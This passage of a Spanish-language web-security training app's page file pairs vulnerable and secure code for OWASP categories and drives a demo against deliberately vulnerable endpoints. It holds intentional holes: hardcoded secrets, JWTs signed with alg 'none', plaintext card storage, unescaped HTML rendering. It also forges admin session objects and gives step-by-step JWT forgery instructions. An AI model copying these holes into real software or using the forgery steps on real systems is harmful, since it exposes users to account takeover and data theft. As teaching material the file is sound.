  ctx.body = { success: true, result, iterations: safeIterations };
});

// ✅ Rate Limiter general para APIs
const generalRateLimiter = rateLimit({
  driver: "redis",
  db: redis,
  duration: 60 * 1000,  // 1 minuto
  max: 100,             // Máximo 100 peticiones
  errorMessage: "Rate limit exceeded"
});

router.get("/data", generalRateLimiter, async (ctx) => {
  // ✅ Máximo 100 peticiones por minuto por IP
  const users = await User.findAll({ 
    limit: 20,  // Limitar resultados por página
    attributes: ["id", "username"]  // Solo campos públicos
  });
  
  ctx.body = { success: true, data: users };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/rate-limiting/login",
        method: "POST",
      },
      secure: {
        url: "/api/secure/rate-limiting/login",
        method: "POST",
      },
    },
    testPayloads: [
      {
        label: "🔐 Login intento #1",
        value: "admin:Test1234",
        type: "safe",
      },
      {
        label: "🔐 Login intento #2",
        value: "admin:Test5678",
        type: "safe",
      },
      {
        label: "🔐 Login intento #3",
        value: "admin:Test9012",
        type: "safe",
      },
      {
        label: "🔴 Intento #6+ (debería bloquearse en modo seguro)",
        value: "admin:Wrong123",
        type: "malicious",
      },
    ],
  },
  "secrets-exposure": {
    title: "Secrets Exposure",
    description:
      "Exposición de credenciales, API keys, y secretos en código, logs, o respuestas",
    category: "A05:2021 - Security Misconfiguration",
    severity: "critical",
    explanation:
      "La exposición de secretos ocurre cuando credenciales, API keys, tokens, o cualquier información sensible se expone en código fuente, logs, mensajes de error, respuestas HTTP, o repositorios de git. Esto permite a atacantes obtener acceso completo a sistemas, bases de datos, servicios externos, o cuentas de usuarios. Es una de las vías más comunes de compromiso.",
    impact: [
      "🔑 Acceso a bases de datos con credenciales expuestas",
      "💳 Uso de API keys de terceros (AWS, Stripe, OpenAI) → facturas enormes",
      "🗂️ Acceso a repositorios privados (GitHub, GitLab)",
      "📧 Envío de emails masivos con credenciales SMTP",
      "🔓 Bypass de autenticación con JWT secrets expuestos",
      "☁️ Compromiso completo de infraestructura cloud",
    ],
    vulnerableExample: `// VULNERABLE: Secretos hardcodeados
// backend/routes/vulnerable/secrets.ts

// 🔴 Hardcoded en código
const DB_PASSWORD = "SuperSecret123!";
const API_KEY = "sk_live_1234567890abcdef";
const JWT_SECRET = "my-super-secret-key";

// 🔴 Exposición en respuesta HTTP
router.get("/config", async (ctx) => {
  ctx.body = {
    database: {
      password: DB_PASSWORD,  // 🔴 CRÍTICO
    },
    apiKeys: {
      stripe: API_KEY,        // 🔴 CRÍTICO
    },
    jwtSecret: JWT_SECRET     // 🔴 CRÍTICO
  };
});

// 🔴 Logging de credenciales
router.post("/connect-database", async (ctx) => {
  const { username, password } = ctx.request.body;
  
  // VULNERABILITY: Logs visibles en servidor
  console.log(\`Connecting with: \${username}:\${password}\`);
  
  ctx.body = { credentials: { username, password } };
});

// 🔴 Secretos en mensajes de error
router.get("/api-call", async (ctx) => {
  try {
    throw new Error(\`API failed with key: \${API_KEY}\`);
  } catch (error) {
    ctx.body = { error: error.message };  // 🔴 Secret expuesto
  }
});

// 🔴 Secretos en git
// .env file (COMMITED TO GIT)
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
DATABASE_URL=postgresql://user:password@localhost:5432/db

// 🔴 Secretos enviados al cliente
router.get("/client-config", async (ctx) => {
  ctx.body = {
    apiKey: API_KEY,           // 🔴 Visible en DevTools
    encryptionKey: "secret123" // 🔴 Cualquiera puede verlo
  };
});`,
    secureExample: `// SECURE: Gestión adecuada de secretos
// backend/routes/secure/secrets.ts
import { config } from "../../config";  // Lee de .env

// ✅ Secretos desde variables de entorno
// .env file (NEVER COMMIT, add to .gitignore)
// AWS_ACCESS_KEY_ID=...
// AWS_SECRET_ACCESS_KEY=...
// DATABASE_URL=...
// JWT_SECRET=...

// ✅ .env.example file (commit this)
// AWS_ACCESS_KEY_ID=your_key_here
// AWS_SECRET_ACCESS_KEY=your_secret_here
// DATABASE_URL=postgresql://user:pass@host:port/db
// JWT_SECRET=generate_strong_secret

// ✅ Solo configuración pública
router.get("/config", async (ctx) => {
  ctx.body = {
    database: {
      host: config.database.host,
      port: config.database.port,
      // ✅ Nunca exponer password
    },
    apiEndpoint: "https://api.example.com",
    // ✅ Nunca exponer API keys
  };
});

// ✅ Nunca loggear credenciales
router.post("/connect-database", async (ctx) => {
  const { username, password } = ctx.request.body;
  
  // ✅ Solo info no sensible
  console.log(\`Connection attempt for user: \${username}\`);
  // ❌ NUNCA: console.log(password);
  
  ctx.body = { 
    success: true,
    // ✅ No devolver credenciales
  };
});

// ✅ Mensajes de error genéricos
router.get("/api-call", async (ctx) => {
  try {
    // API call con secretos seguros
    const result = await externalAPI(config.apiKey);
  } catch (error) {
    // ✅ Log completo solo en servidor
    logger.error("API error (server-side):", error);
    
    // ✅ Mensaje genérico al cliente
    ctx.status = 500;
    ctx.body = { 
      error: "API call failed. Please try again.",
      errorId: Date.now()  // Para soporte
    };
  }
});

// ✅ .gitignore
/*
.env
.env.local
.env.production
*.pem
*.key
secrets/
*/

// ✅ Solo configuración pública al cliente
router.get("/client-config", async (ctx) => {
  ctx.body = {
    apiEndpoint: "https://api.example.com",
    // ✅ Solo public keys si es necesario
    publicKey: "pk_public_...",  // Stripe public key (seguro)
    // ❌ NUNCA enviar secret keys
  };
});

// ✅ Usar servicios de gestión de secretos
import { SecretsManager } from "@aws-sdk/client-secrets-manager";

const secretsManager = new SecretsManager({ region: "us-east-1" });

async function getSecret(secretName: string) {
  const response = await secretsManager.getSecretValue({
    SecretId: secretName
  });
  return JSON.parse(response.SecretString);
}`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/secrets/config",
        method: "GET",
      },
      secure: {
        url: "/api/secure/secrets/config",
        method: "GET",
      },
    },
    testPayloads: [
      {
        label: "🔧 Ver configuración del servidor",
        value: "config",
        type: "malicious",
      },
      {
        label: "🔑 Ver secretos en git",
        value: "git-secrets",
        type: "malicious",
      },
      {
        label: "📱 Ver config del cliente",
        value: "client-config",
        type: "malicious",
      },
      {
        label: "❌ Ver error con secretos",
        value: "api-call",
        type: "malicious",
      },
    ],
  },
  "authentication-failures": {
    title: "Authentication Failures",
    description:
      "Fallas en autenticación y gestión de sesiones que permiten bypass",
    category: "A07:2021 - Identification and Authentication Failures",
    severity: "critical",
    explanation:
      "Las fallas de autenticación permiten a atacantes comprometer passwords, keys, tokens de sesión, o explotar debilidades para asumir identidades de otros usuarios. En este demo veremos JWT con algoritmo 'none', que permite falsificar tokens sin conocer el secret.",
    impact: [
      "🎭 Robo de identidad completo",
      "🔑 Falsificación de tokens JWT (algoritmo 'none')",
      "📍 Fijación de sesiones (Session Fixation)",
      "👤 Enumeración de usuarios (password reset)",
      "🔓 Login con passwords débiles (123, password)",
    ],
    vulnerableExample: `// VULNERABLE: JWT con algoritmo 'none'
// backend/routes/vulnerable/authFailures.ts
router.post("/login-none-alg", async (ctx) => {
  const { username, password } = ctx.request.body;
  const user = await User.findOne({ where: { username } });
  
  if (!user || !(await user.validatePassword(password))) {
    ctx.status = 401;
    ctx.body = { error: "Invalid credentials" };
    return;
  }
  
  // VULNERABILITY: Token sin secret, algoritmo "none"
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    "",  // ⚠️ Sin secret!
    { algorithm: "none" }  // Cualquiera puede falsificar
  );
  
  ctx.body = { success: true, token };
});

// 🔴 Ataque: Modificar el payload del JWT y cambiar role a "admin"
// El servidor aceptará el token porque no verifica la firma`,
    secureExample: `// SECURE: JWT con secret fuerte y algoritmo seguro
// backend/routes/secure/authFailures.ts
router.post("/login", async (ctx) => {
  const { username, password } = ctx.request.body;
  const user = await User.findOne({ where: { username } });
  
  if (!user || !(await user.validatePassword(password))) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid credentials' };  // Genérico
    return;
  }
  
  // ✅ SECURE: Secret fuerte, algoritmo seguro, expiración
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    process.env.JWT_SECRET,  // Secret desde env variable
    { 
      algorithm: 'HS256',    // Algoritmo criptográfico fuerte
      expiresIn: '24h'       // Expiración
    }
  );
  
  ctx.body = { success: true, token };
});

// ✅ Validar siempre el secret y especificar algoritmos permitidos
jwt.verify(token, process.env.JWT_SECRET, { 
  algorithms: ['HS256', 'HS512']  // Lista blanca
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/auth/login-none-alg",
        method: "POST",
      },
      secure: { url: "/api/secure/auth/login", method: "POST" },
    },
    testPayloads: [
      {
        label: "👤 Login user normal",
        value: "user:user123",
        type: "safe",
      },
      {
        label: "👤 Login alice",
        value: "alice:alice123",
        type: "safe",
      },
      {
        label: "👑 Login admin (verás role: admin)",
        value: "admin:admin123",
        type: "safe",
      },
      {
        label: "👤 Login bob",
        value: "bob:bob123",
        type: "safe",
      },
    ],
  },
  "sensitive-data": {
    title: "Cryptographic Failures (Sensitive Data Exposure)",
    description:
      "Exposición de datos sensibles por falta de encriptación o cifrado débil",
    category: "A02:2021 - Cryptographic Failures",
    severity: "critical",
    explanation:
      "Cryptographic Failures ocurren cuando datos sensibles son transmitidos o almacenados sin protección adecuada. Esto incluye almacenar contraseñas sin hash, tarjetas de crédito en texto plano, usar cifrado débil (Base64, ROT13), o exponer hashes de passwords.",
    impact: [
      "💳 Robo de información financiera (tarjetas de crédito)",
      "🔑 Exposición de hashes de passwords (ataques de fuerza bruta)",
      "🔓 Datos médicos o personales comprometidos",
      "📧 Información de identificación personal (PII) expuesta",
      "🔐 API keys y secrets expuestos",
    ],
    vulnerableExample: `// VULNERABLE: Almacenamiento en texto plano
// backend/routes/vulnerable/sensitiveData.ts
router.post("/save-payment", async (ctx) => {
  const { creditCard, cvv, expiryDate } = ctx.request.body;
  
  // VULNERABILITY: Almacenar datos sensibles sin cifrar
  const paymentData = {
    creditCard: creditCard,  // ⚠️ Texto plano!
    cvv: cvv,                // ⚠️ Nunca debe almacenarse!
    expiryDate: expiryDate
  };
  
  // Guardar en BD en texto plano
  await Payment.create(paymentData);
  
  ctx.body = { 
    success: true, 
    data: paymentData  // ⚠️ Devolviendo datos sensibles
  };
});

// VULNERABLE: Cifrado débil (Base64 NO es cifrado)
const "encrypted" = Buffer.from(data).toString("base64");

// VULNERABLE: Exponiendo password hash
ctx.body = {
  username: user.username,
  password: user.password  // ⚠️ Hash expuesto!
};`,
    secureExample: `// SECURE: Cifrado fuerte con AES-256-GCM
// backend/routes/secure/sensitiveData.ts
import crypto from 'crypto';

router.post("/save-payment", async (ctx) => {
  const { creditCard, expiryDate } = ctx.request.body;
  
  // ✅ NUNCA aceptar o almacenar CVV
  // ✅ Cifrar con AES-256-GCM
  const algorithm = 'aes-256-gcm';
  const key = crypto.scryptSync(SECRET, 'salt', 32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  
  const encrypted = Buffer.concat([
    cipher.update(creditCard, 'utf8'),
    cipher.final()
  ]);
  
  const authTag = cipher.getAuthTag();
  
  // Solo almacenar últimos 4 dígitos para display
  const last4 = creditCard.slice(-4);
  
  await Payment.create({
    cardLast4: last4,           // Solo para mostrar
    cardEncrypted: encrypted,   // Cifrado fuerte
    iv: iv,                     // Initialization vector
    authTag: authTag            // Para verificar integridad
  });
  
  ctx.body = { 
    success: true, 
    cardLast4: last4  // ✅ Solo últimos 4 dígitos
  };
});

// ✅ Excluir password hash de las respuestas
const user = await User.findByPk(id, {
  attributes: { exclude: ['password'] }
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/sensitive-data/save-payment",
        method: "POST",
      },
      secure: {
        url: "/api/secure/sensitive-data/save-payment",
        method: "POST",
      },
    },
    testPayloads: [
      {
        label: "💳 Tarjeta válida",
        value: "4532015112830366:123:12/25",
        type: "safe",
      },
      {
        label: "💳 Tarjeta de prueba",
        value: "5425233430109903:456:06/26",
        type: "safe",
      },
      {
        label: "💳 American Express",
        value: "374245455400126:7890:09/27",
        type: "safe",
      },
    ],
  },
  // Add more vulnerabilities...
};

export default function VulnerabilityPage() {
  const params = useParams();
  const id = params.id as string;
  const [mode, setMode] = useState<"vulnerable" | "secure">("vulnerable");
  const [loading, setLoading] = useState(false);
  const [input, setInput] = useState("");
  const [result, setResult] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  const [xssPosts, setXssPosts] = useState<any[]>([]);

  const vuln = vulnerabilityData[id];

  if (!vuln) {
    return (
      <div className="container mx-auto px-4 py-8">
        <div className="card text-center">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">
            Vulnerabilidad no encontrada
          </h1>
          <Link href="/" className="btn btn-primary">
            Volver al inicio
          </Link>
        </div>
      </div>
    );
  }

  const handleTest = async () => {
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const endpointConfig =
        mode === "vulnerable"
          ? vuln.demoEndpoints.vulnerable
          : vuln.demoEndpoints.secure;

      let method = endpointConfig.method || "GET";
      let url = endpointConfig.url;

      // Security Misconfiguration: admin-login requiere POST
      if (id === "security-misconfiguration" && input === "admin-login") {
        method = "POST";
      }

      let response;

      if (method === "GET") {
        // Para Broken Access Control, agregar el ID directamente a la URL
        if (id === "broken-access-control") {
          url = `${url}/${input}`;
          response = await apiClient.call("GET", url, {});
        }
        // Para Security Misconfiguration, el input es el nombre del endpoint
        else if (id === "security-misconfiguration") {
          url = `${url}/${input}`;
          response = await apiClient.call("GET", url, {});
        }
        // Para Secrets Exposure, el input es el nombre del endpoint
        else if (id === "secrets-exposure") {
          const baseUrl = url.substring(0, url.lastIndexOf("/"));
          url = `${baseUrl}/${input}`;
          response = await apiClient.call("GET", url, {});
        } else {
          // Para otras vulnerabilidades GET, enviar como query parameter
          let queryParams;

          if (id === "command-injection") {
            queryParams = { host: input };
          } else if (id === "sql-injection") {
            queryParams = { query: input };
          } else {
            queryParams = { query: input, q: input };
          }

          response = await apiClient.call("GET", url, queryParams);
        }
      } else if (method === "POST") {
        // Para POST, determinar formato según la vulnerabilidad
        let body;

        // Security Misconfiguration: admin-login usa credenciales por defecto
        if (id === "security-misconfiguration" && input === "admin-login") {
          url = `${url}/${input}`;
          body = { username: "admin", password: "admin" };
        }
        // XSS: Crear post con título y contenido
        else if (id === "xss") {
          body = {
            title: "Demo Post",
            content: input,
          };
        }
        // Authentication endpoints esperan username:password
        else if (id === "authentication-failures" && input.includes(":")) {
          const [username, password] = input.split(":");
          body = { username: username || "", password: password || "" };
        }
        // Sensitive Data: creditCard:cvv:expiryDate
        else if (id === "sensitive-data" && input.includes(":")) {
          const parts = input.split(":");
          body = {
            userId: 1, // Usuario de prueba
            creditCard: parts[0] || "",
            cvv: parts[1] || "",
            expiryDate: parts[2] || "",
          };
        }
        // CSRF: toUser:amount
        else if (id === "csrf" && input.includes(":")) {
          const [toUser, amount] = input.split(":");
          body = { toUser: toUser || "", amount: parseInt(amount) || 0 };
        }
        // SSRF: url
        else if (id === "ssrf") {
          body = { url: input };
        }
        // Insecure Deserialization: generar sesiones falsificadas
        else if (id === "insecure-deserialization") {
          let sessionObject;

          if (input === "normal-session") {
            sessionObject = {
              user: {
                id: 2,
                username: "user",
                role: "user",
              },
              expiresAt: new Date(Date.now() + 3600000).toISOString(),
            };
          } else if (input === "admin-session") {
            sessionObject = {
              user: {
                id: 999,
                username: "hacker",
                role: "admin", // 🔴 Elevación de privilegios
              },
              expiresAt: new Date(Date.now() + 3600000).toISOString(),
            };
          } else if (input === "balance-session") {
            sessionObject = {
              user: {
                id: 3,
                username: "richuser",
                role: "user",
                balance: 1000000, // 🔴 Balance falsificado
              },
              expiresAt: new Date(Date.now() + 3600000).toISOString(),
            };
          } else if (input === "elevated-session") {
            sessionObject = {
              user: {
                id: 4,
                username: "poweruser",
                role: "user",
                permissions: ["read", "write", "delete", "admin"], // 🔴 Permisos elevados
              },
              expiresAt: new Date(Date.now() + 3600000).toISOString(),
            };
          }

          // Serializar a base64
          const sessionData = btoa(JSON.stringify(sessionObject));
          body = { sessionData };
        }
        // Rate Limiting: username:password para login
        else if (id === "rate-limiting" && input.includes(":")) {
          const [username, password] = input.split(":");
          body = { username: username || "", password: password || "" };
        }
        // Otros POST que usan formato param1:param2
        else if (input.includes(":")) {
          const [param1, param2] = input.split(":");
          body = { to: param1, amount: param2 };
        }
        // Command injection y otros
        else {
          body = { target: input, host: input, ip: input };
        }

        response = await apiClient.call("POST", url, body);

        // Para XSS, después de crear el post, obtener todos los posts
        if (id === "xss" && response?.data?.success) {
          try {
            const getUrl = url.replace(/\/posts$/, "/posts");
            const postsResponse = await apiClient.call("GET", getUrl, {});
            setXssPosts(postsResponse?.data?.data || []);
          } catch (e) {
            console.error("Error fetching posts:", e);
          }
        }
      }

      setResult(response?.data);

      // Para Authentication Failures: guardar token automáticamente
      if (
        id === "authentication-failures" &&
        response?.data?.success &&
        response?.data?.data?.token
      ) {
        const token = response.data.data.token;

        // Guardar en localStorage (para uso normal con Authorization header)
        localStorage.setItem("token", token);

        // TAMBIÉN guardar en cookie para que CSRF funcione correctamente
        // Cookie sin HttpOnly para que JavaScript pueda acceder (demo educativa)
        // En producción real, la cookie debería ser HttpOnly
        document.cookie = `auth_token=${token}; path=/; SameSite=Lax; max-age=86400`;

        console.log("✅ JWT Token guardado en localStorage:", token);
        console.log("✅ JWT Token guardado en cookie (para CSRF demo)");
        console.log("📝 Cookie:", document.cookie);

        // Mostrar mensaje al usuario
        setTimeout(() => {
          alert(
            "✅ Token JWT guardado automáticamente en:\n• localStorage (para headers Authorization)\n• Cookie (para que CSRF funcione)\n\nAhora el navegador enviará el token automáticamente en cada petición."
          );
        }, 500);
      }
    } catch (err: any) {
      setError(err.response?.data?.error || err.message);
      setResult(err.response?.data);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container mx-auto px-4 py-8">
      {/* Back Button */}
      <Link
        href="/"
        className="inline-flex items-center gap-2 text-primary-600 hover:text-primary-700 mb-6"
      >
        <ArrowLeft className="w-4 h-4" />
        Volver al catálogo
      </Link>

      {/* Header */}
      <div className="card mb-6">
        <div className="flex items-start justify-between mb-4">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">
              {vuln.title}
            </h1>
            <p className="text-gray-600">{vuln.description}</p>
          </div>
          <span
            className={`badge ${
              vuln.severity === "critical"
                ? "badge-danger"
                : vuln.severity === "high"
                ? "bg-orange-100 text-orange-800"
                : "badge-warning"
            } text-sm px-3 py-1`}
          >
            {vuln.severity.toUpperCase()}
          </span>
        </div>
        <div className="text-sm text-gray-500">{vuln.category}</div>
      </div>

      {/* Explanation */}
      <div className="card mb-6">
        <h2 className="text-xl font-semibold text-gray-900 mb-3">
          ¿Qué es esta vulnerabilidad?
        </h2>
        <p className="text-gray-700 mb-4">{vuln.explanation}</p>

        <h3 className="text-lg font-semibold text-gray-900 mb-2">
          Impacto potencial:
        </h3>
        <ul className="list-disc list-inside space-y-1 text-gray-700">
          {vuln.impact.map((item: string, index: number) => (
            <li key={index}>{item}</li>
          ))}
        </ul>
      </div>

      {/* Code Examples */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
        {/* Vulnerable Code */}
        <div className="card border-2 border-danger-200">
          <div className="flex items-center gap-2 mb-3">
            <AlertTriangle className="w-5 h-5 text-danger-600" />
            <h3 className="text-lg font-semibold text-danger-900">
              Código Vulnerable
            </h3>
          </div>
          <CodeBlock
            code={vuln.vulnerableExample}
            language="javascript"
            showLineNumbers
          />
        </div>

        {/* Secure Code */}
        <div className="card border-2 border-success-200">
          <div className="flex items-center gap-2 mb-3">
            <CheckCircle className="w-5 h-5 text-success-600" />
            <h3 className="text-lg font-semibold text-success-900">
              Código Seguro
            </h3>
          </div>
          <CodeBlock
            code={vuln.secureExample}
            language="javascript"
            showLineNumbers
          />
        </div>
      </div>

      {/* Interactive Demo */}
      <div className="card mb-6">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xl font-semibold text-gray-900">
            Demostración Interactiva
          </h3>
          <div className="inline-flex rounded-lg border border-gray-200 p-1">
            <button
              onClick={() => setMode("vulnerable")}
              className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                mode === "vulnerable"
                  ? "bg-danger-600 text-white"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              Vulnerable
            </button>
            <button
              onClick={() => setMode("secure")}
              className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                mode === "secure"
                  ? "bg-success-600 text-white"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              Seguro
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Entrada de prueba:
            </label>
            <input
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Ingresa un valor de prueba..."
              className="input"
            />

            {/* Authentication Failures Info */}
            {id === "authentication-failures" && (
              <div className="mt-3 p-3 bg-blue-50 border border-blue-200 rounded-lg">
                <p className="text-xs text-blue-800">
                  <strong>ℹ️ Formato:</strong> Usa{" "}
                  <code className="bg-blue-100 px-1 rounded">
                    username:password
                  </code>
                  . En modo <strong>Vulnerable</strong>, recibirás un JWT con
                  algoritmo "none" que puedes modificar y falsificar. En modo{" "}
                  <strong>Seguro</strong>, el JWT tendrá una firma criptográfica
                  real que no puedes falsificar.
                </p>
              </div>
            )}

            {/* Sensitive Data Info */}
            {id === "sensitive-data" && (
              <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-xs text-red-800">
                  <strong>💳 Formato:</strong> Usa{" "}
                  <code className="bg-red-100 px-1 rounded">
                    tarjeta:cvv:fecha
                  </code>
                  . En modo <strong>Vulnerable</strong>, la tarjeta y CVV se
                  almacenarán en texto plano y se devolverán en la respuesta. En
                  modo <strong>Seguro</strong>, la tarjeta será cifrada con
                  AES-256 y solo se devolverán los últimos 4 dígitos.
                </p>
              </div>
            )}

            {/* CSRF Info */}
            {id === "csrf" && (
              <>
                {typeof window !== "undefined" &&
                localStorage.getItem("token") ? (
                  <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
                    <p className="text-xs text-green-800">
                      <strong>✅ Token JWT Detectado en Cookie:</strong> Estás
                      autenticado y puedes usar los endpoints CSRF. <br />
                      <strong>🍪 CSRF y Cookies:</strong> El token se guardó en
                      una cookie que el navegador enviará AUTOMÁTICAMENTE en
                      cada petición. Esto permite el ataque CSRF porque un sitio
                      malicioso puede hacer que tu navegador envíe peticiones
                      con tu sesión. <br />
                      <strong>Formato:</strong> Usa{" "}
                      <code className="bg-green-100 px-1 rounded">
                        usuario:monto
                      </code>
                      . En modo <strong>Vulnerable</strong>, la transferencia se
                      ejecutará sin validar el origen. En modo{" "}
                      <strong>Seguro</strong>, requerirá un token CSRF.
                      <br />
                      <button
                        onClick={() => {
                          localStorage.removeItem("token");
                          document.cookie =
                            "auth_token=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                          alert(
                            "Token eliminado de localStorage y cookie. Recarga la página."
                          );
                          window.location.reload();
                        }}
                        className="mt-2 text-xs px-2 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                      >
                        🗑️ Eliminar Token y Cookie
                      </button>
                    </p>
                  </div>
                ) : (
                  <div className="mt-3 p-3 bg-orange-50 border border-orange-200 rounded-lg">
                    <p className="text-xs text-orange-800">
                      <strong>⚠️ CSRF Requiere Autenticación:</strong> No se
                      detectó un JWT token. Primero haz login en{" "}
                      <strong>Authentication Failures</strong> con cualquier
                      usuario (ej:{" "}
                      <code className="bg-orange-100 px-1 rounded">
                        admin:admin123
                      </code>
                      ). <br />
                      <strong>🍪 ¿Por qué Cookie?</strong> El token se guardará
                      en una <strong>cookie</strong> que el navegador enviará
                      automáticamente. Esto es NECESARIO para CSRF porque el
                      ataque funciona cuando el navegador envía credenciales sin
                      que el usuario lo sepa. <br />
                      <strong>Formato después del login:</strong> Usa{" "}
                      <code className="bg-orange-100 px-1 rounded">
                        usuario:monto
                      </code>
                    </p>
                  </div>
                )}
              </>
            )}

            {vuln.testPayloads && vuln.testPayloads.length > 0 && (
              <div className="mt-3">
                <p className="text-xs text-gray-600 mb-2">
                  Payloads de ejemplo:
                </p>
                <div className="flex flex-wrap gap-2">
                  {vuln.testPayloads.map((payload: any, index: number) => (
                    <button
                      key={index}
                      type="button"
                      onClick={() => setInput(payload.value)}
                      className={`text-xs px-3 py-1.5 rounded-lg border-2 transition-all hover:shadow-md ${
                        payload.type === "malicious"
                          ? "border-danger-200 bg-danger-50 text-danger-700 hover:border-danger-300 hover:bg-danger-100"
                          : "border-success-200 bg-success-50 text-success-700 hover:border-success-300 hover:bg-success-100"
                      } ${
                        input === payload.value ? "ring-2 ring-offset-1" : ""
                      }`}
                      title={payload.value}
                    >
                      {payload.label}
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleTest}
              disabled={loading || !input}
              className="btn btn-primary flex items-center gap-2"
            >
              <Play className="w-4 h-4" />
              {loading ? "Ejecutando..." : "Ejecutar prueba"}
            </button>

            {/* HTTP Method Indicator */}
            <div className="flex items-center gap-2 text-xs">
              <span className="text-gray-500">Método:</span>
              <span
                className={`px-2 py-1 rounded font-mono font-semibold ${
                  (mode === "vulnerable"
                    ? vuln.demoEndpoints.vulnerable.method
                    : vuln.demoEndpoints.secure.method) === "GET"
                    ? "bg-blue-100 text-blue-700"
                    : "bg-green-100 text-green-700"
                }`}
              >
                {mode === "vulnerable"
                  ? vuln.demoEndpoints.vulnerable.method
                  : vuln.demoEndpoints.secure.method}
              </span>
            </div>
          </div>

          {(result || error) && (
            <div className="mt-4">
              <h4 className="text-sm font-medium text-gray-700 mb-2">
                Respuesta:
              </h4>
              {error && (
                <div className="mb-2 p-3 bg-danger-50 border border-danger-200 rounded-lg">
                  <p className="text-sm text-danger-800">{error}</p>
                </div>
              )}

              {/* XSS Stored Info */}
              {id === "xss" && result?.success && mode === "vulnerable" && (
                <div className="mb-3 p-3 bg-orange-50 border border-orange-200 rounded-lg">
                  <p className="text-sm text-orange-800">
                    <strong>⚠️ Stored XSS:</strong> El post malicioso fue
                    guardado en la base de datos. Para ver el XSS en acción,
                    visita{" "}
                    <code className="bg-orange-100 px-1 py-0.5 rounded">
                      GET /api/vulnerable/xss/posts
                    </code>{" "}
                    o abre la página que muestra posts. ¡El script se ejecutará
                    para TODOS los usuarios!
                  </p>
                </div>
              )}

              {/* Authentication JWT Decoder */}
              {id === "authentication-failures" &&
                result?.success &&
                result?.data?.token &&
                mode === "vulnerable" && (
                  <div className="mb-3 p-4 bg-red-50 border-2 border-red-300 rounded-lg">
                    <h5 className="text-sm font-bold text-red-900 mb-2">
                      🔓 JWT Vulnerable Detectado (Algoritmo "none")
                    </h5>
                    <p className="text-xs text-red-800 mb-3">
                      Este token NO tiene firma criptográfica. Puedes modificar
                      el payload y el servidor lo aceptará.
                    </p>

                    <div className="bg-white p-3 rounded border border-red-200 mb-3">
                      <p className="text-xs font-mono text-gray-700 break-all mb-2">
                        <strong>Token:</strong> {result.data.token}
                      </p>
                    </div>

                    <div className="bg-white p-3 rounded border border-red-200">
                      <p className="text-xs font-bold text-gray-900 mb-2">
                        💡 Cómo Explotarlo:
                      </p>
                      <ol className="text-xs text-gray-700 space-y-1 list-decimal list-inside">
                        <li>
                          Decodifica el token en{" "}
                          <a
                            href="https://jwt.io"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-blue-600 underline"
                          >
                            jwt.io
                          </a>
                        </li>
                        <li>
                          Cambia el campo{" "}
                          <code className="bg-gray-100 px-1 rounded">role</code>{" "}
                          a{" "}
                          <code className="bg-gray-100 px-1 rounded">
                            "admin"
                          </code>
                        </li>
                        <li>
                          Copia el token modificado (mantén el algoritmo como
                          "none")
                        </li>
                        <li>
                          Úsalo para acceder a endpoints protegidos como admin
                        </li>
                      </ol>
                    </div>

                    {(() => {
                      try {
                        const parts = result.data.token.split(".");
                        const payload = JSON.parse(atob(parts[1]));
                        return (
                          <div className="mt-3 bg-white p-3 rounded border border-red-200">
                            <p className="text-xs font-bold text-gray-900 mb-2">
                              🔍 Payload Decodificado:
                            </p>
                            <CodeBlock
                              code={JSON.stringify(payload, null, 2)}
                              language="json"
                            />
                          </div>
                        );
                      } catch (e) {
                        return null;
                      }
                    })()}
                  </div>
                )}

              <CodeBlock
                code={JSON.stringify(result, null, 2)}
                language="json"
                showLineNumbers
              />
            </div>
          )}

          {/* XSS Posts Preview */}
          {id === "xss" && xssPosts.length > 0 && (
            <div className="mt-6">
              <h4 className="text-sm font-medium text-gray-700 mb-3">
                📋 Posts en la Base de Datos (últimos 3):
              </h4>
              <div className="space-y-3">
                {xssPosts.slice(0, 3).map((post: any, index: number) => (
                  <div
                    key={post.id || index}
                    className={`p-4 rounded-lg border-2 ${
                      mode === "vulnerable"
                        ? "border-danger-200 bg-danger-50"
                        : "border-success-200 bg-success-50"
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <h5 className="font-semibold text-gray-900">
                        {post.title}
                      </h5>
                      <span className="text-xs text-gray-500">
                        ID: {post.id}
                      </span>
                    </div>

                    {mode === "vulnerable" ? (
                      <>
                        <div className="mb-2 p-2 bg-red-100 border border-red-300 rounded text-xs text-red-800">
                          ⚠️ <strong>PELIGRO:</strong> Contenido renderizado SIN
                          escapar (dangerouslySetInnerHTML)
                        </div>
                        <div
                          className="prose prose-sm max-w-none"
                          dangerouslySetInnerHTML={{ __html: post.content }}
                        />
                      </>
                    ) : (
                      <>
                        <div className="mb-2 p-2 bg-green-100 border border-green-300 rounded text-xs text-green-800">
                          ✅ <strong>SEGURO:</strong> Contenido escapado (React
